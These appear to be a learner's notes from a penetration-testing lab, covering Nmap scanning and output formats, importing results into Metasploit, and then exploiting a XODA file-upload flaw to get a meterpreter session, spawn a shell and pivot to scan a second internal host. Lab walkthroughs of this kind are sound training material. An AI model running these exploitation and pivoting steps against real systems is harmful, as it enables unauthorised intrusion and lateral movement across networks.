# Port Scanning and Enumeration with NMAP

### Discover, Scand and Export NMAP Scan Results (Example)

Discover available live hosts and their open ports using Nmap and identify the running services and applications.
 
- ping demo.ine.local --> bocked
- nmap demo.ine.local --> blocked
- nmap -Pn demo.ine.local --> worked
- nmap -Pn -sV -O demo.ine.local --> for ServiveVersion and OSVersion
- nmap -Pn -sV -O demo.ine.local -oX windows_server_2012 --> Creates xml file and inserts informations

### Nmap Output Formats

 - `-oN` = normal format, saves result how you see it 
 - `-oX` = xml format, offers a conversion layer and import it into metasploit framework 
 - `-oS` = Script kiddie
 - `-oG` = outputs scan results in grepable format
 - `-oA` = all 3 normal formats at once (oN, oX, oG) 
 - `-v` = Increase verbosity 
 - `--reason` = displays the reason a port is in a particular state
 - Example: `nmap -Pn -sS -F -T4 [target IP] -oN \path\filename.txt`

### Import nmap scan results in metasploit framework (xml format output):
- `service postgresql start`
- `msfconsole`
- msf6: `workspace -h`
- msf6: `workspace -a pentest_1`
- msf6: `workspace`
- msf6: `db_status`, check status, is msf connected to the postgresql database where the data is stored?
- msf6s: `dbimport nmap_xml.xml`
- msf6s: `hosts`
- msf6: `services`
- msf5: `nmap -Pn -sS -sV -O -p445 [target IP] `
- msf6s: `hosts`, metasploit framework updates file
- Grepable Format: `nmap -Pn -sS -F -T4 [target IP] -oG nmap_grep.txt`
- `cat nmap_gep.txt`, we see that its a grepable format

### Importing Nmap Scan Results into MSF

- Exporting Nmap scan: `nmap -Pn -sV -O -oX nmapscan.xml demo.ine.local`
- Start postgresql database service: `service postgresql start`
- Start the Metasploit Framework console: `msfconsole`
- Verify that the MSF database is connected: `db_status`
- Import the the Nmap Scan Results: `db_import nmapscan.xml`
- Check the results: `hosts` and `services`

### Auxiliary Modules
An Auxiliary Module is a type of module within a system that includes exploits without payloads and enhances the functionality of the system by performing tasks like remote system scanning and fingerprinting. They are used to perform functionality, discovery and fuzzing. Against NMAP scans, auxiliary modules are more effective in the post-exploitation phase because they allow us to identify whether the server or PC, whose IP we have, is part of an internal network. Additionally, this may enable us to exploit other devices.

**Practical:**
- First check your IP address: `ifconfig`
- Make sure the postgreSQL service is started: `service postgresql start`
- Start msfconsole: `msfconsole`
- Check Database status: `db_status` If connection type = postgresql everything is allright.
- Add a Workspace: `workspace -a "examplename"`
- You can check the current workspace your working in with`workspace` (the res star shows your selected workspace)
- You can change the current workspace with `workspace "name of the workspace you want"`
- Search Auxiliary Modules: `search (portscan)`
- You can select and use a module by: `use (name of the module or number)`
- `show options`
- Set the RHOST `set RHOSTS 192.168.20.3`
- execute the module: `run`
- downloading the webpage of the IP adress to what we can identify: `curl 192.168.20.3`

**Run udp_sweep**
- `search udP_sweep`
- `run auxiliary/scanner/discovery/udp_sweep`
- `show options`
- `set RHOST 192.168.20.3`
- `run`

**Exploiting XODA-Service (what we just curled)**set
- `search Xoda`
- `use exploit/unix/webapp/xoda_file_upload`
- `show options`
- `set RHOSTS 192.168.20.3`
- set Path on the Xoda device to root: `set TARGETURI /`
- run our exploit: `exploit`
- It did not work Problemsolving: I had to set LHOST because I have bound to a loopback address by default(127.0.0.1): `set LHOST 192.198.6.2`(my IP)
- `exploit` run exploit again, it worked and we received a meterpreter session.
- `sysinfo` to get Informations of the Targentmachine
- We want to execute a Portscan on the second machine in the network:
- `shell` open shell session
- `/bin/bash -i` spawn a bash session to run commands easily
- `ifconfig` to get the Target IP
- Ctrl C to go back to meterpreter
- `run autorun -s 192.102.202.2` set the address route and provide the subnet
- `background` background session 1
- `sessions` view your sessions
- `search portscan`
- `use 5`
- `set RHOSTS 192.102.202.3`
- Because we already configured the route(so that the Scan comes from the exploited machine) we can run the scan: `run`
- leave module: `back`
